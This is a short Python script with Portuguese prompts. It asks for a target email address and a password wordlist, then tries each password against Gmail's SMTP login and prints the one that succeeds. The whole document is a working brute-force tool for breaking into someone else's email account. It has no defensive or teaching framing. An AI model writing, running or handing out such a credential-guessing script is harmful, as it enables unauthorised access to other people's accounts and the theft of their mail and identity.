import smtplib
import sys
import threading
import ssl
from colorama import Fore, Style

context = ssl.create_default_context()
smtpServer = smtplib.SMTP("smtp.gmail.com", 587)
smtpServer.ehlo()
smtpServer.starttls(context=context)

target_email = input("[+] Entre com o email alvo: ")
passwd_file = input("[+] Entre com o caminho para a wordlist de senhas: ")

def check_pwd():
    with open(passwd_file, "r") as f:
        passwords = f.readlines()
        f.close()
    for pwd in passwords:
        pwd = pwd.strip("\n")
        try:
            smtpServer.login(target_email, pwd)
            print(Fore.GREEN + f"[!] Password for user {target_email} found! [!]" + Style.RESET_ALL)
            print(Fore.GREEN + f"[+] Password Found: {pwd}" + Style.RESET_ALL)
            sys.exit(1)
        except smtplib.SMTPAuthenticationError:
            pass
            #print(Fore.RED + f"[!] Wrong Password: {pwd}" + Style.RESET_ALL)

threading.Thread(target=check_pwd()).start()